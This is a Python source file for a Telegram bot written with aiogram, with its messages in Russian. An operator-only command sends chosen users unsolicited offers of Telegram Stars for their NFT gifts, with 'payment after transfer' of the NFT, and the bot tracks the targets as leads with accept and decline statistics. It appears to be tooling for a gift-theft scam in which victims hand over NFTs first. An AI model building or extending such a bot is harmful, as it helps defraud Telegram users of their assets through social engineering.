from aiogram import Router, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, ChatType

from config import OPERATOR_ID, GIFT_USERNAME, STARS_AMOUNT
from db import add_lead, get_stats
from keyboards import offer_keyboard

router = Router()

@router.message(Command("start"))
async def cmd_start(message: Message):
    if message.chat.type != ChatType.PRIVATE:
        return
    await message.answer(
        "Привет! Тебе поступило предложение по твоему NFT.\n"
        "Ожидай сообщение с деталями."
    )

@router.message(Command("id"))
async def cmd_id(message: Message):
    await message.reply(f"Твой ID: <code>{message.from_user.id}</code>", parse_mode="HTML")

@router.message(Command("offer"))
async def cmd_offer(message: Message):
    if message.from_user.id != OPERATOR_ID:
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.reply("Использование: /offer user_id (числом)")
        return
    target = parts[1].strip()
    
    # Тот самый текст оффера
    text = (
        f"💰 <b>Саша Ксивайт</b> предлагает вам <b>{STARS_AMOUNT} ⭐</b> за ваш <b>NFT-подарок</b>.\n"
        f"🔗 <a href='https://t.me/nft/...'>Ссылка на подарок</a>\n\n"
        f"<i>Оплата зачислится после передачи NFT.</i>"
    )
    
    try:
        target_id = int(target)
        await message.bot.send_message(
            chat_id=target_id,
            text=text,
            reply_markup=offer_keyboard(target_id),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        await message.reply(f"Оффер отправлен ID {target_id}")
    except Exception as e:
        await message.reply(f"Ошибка: {e}")

@router.message(Command("stats"))
async def cmd_stats(message: Message):
    if message.from_user.id != OPERATOR_ID:
        return
    total, accepted, declined = await get_stats()
    await message.reply(
        f"📊 <b>Статистика</b>\n"
        f"Всего лидов: {total}\n"
        f"Приняли: {accepted}\n"
        f"Отклонили: {declined}",
        parse_mode="HTML",
    )

@router.callback_query(F.data.startswith("offer:decline"))
async def on_offer_decline(call: CallbackQuery):
    _, choice, _ = call.data.split(":")
    u = call.from_user
    await add_lead(u.id, u.username or "", u.first_name or "", choice, "offered")

    text = "❌ <b>Оффер отклонён.</b>\n\nВы отклонили предложение."
    
    await call.message.edit_text(text, parse_mode="HTML")
    await call.answer()

    try:
        await call.bot.send_message(
            OPERATOR_ID,
            f"🎯 Лид (Отказ): @{u.username or '—'} (ID {u.id})",
            parse_mode="HTML",
        )
    except Exception:
        pass
